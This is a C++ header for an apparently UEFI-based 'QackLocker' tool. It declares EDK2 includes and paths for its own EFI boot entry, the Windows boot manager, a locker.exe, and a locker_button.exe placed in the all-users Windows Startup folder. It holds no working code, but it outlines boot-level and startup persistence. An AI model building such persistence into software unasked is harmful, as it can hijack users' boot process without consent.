// language: C++, file: QackLockerEfi.h
#pragma once

extern "C" {
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DevicePathLib.h>
#include <Library/FileHandleLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/DevicePath.h>
#include <Guid/GlobalVariable.h>
}

#define QACK_LOCKER_DIR       L"\\EFI\\QackLocker"
#define QACK_BOOT_EFI         L"\\EFI\\QackLocker\\bootx64.efi"
#define QACK_LOCKER_EXE       L"\\EFI\\QackLocker\\locker.exe"
#define QACK_BOOT_ENTRY_NAME  L"QackLocker"
#define WINDOWS_BOOTMGR       L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"
#define STARTUP_DIR           L"\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\locker_button.exe"
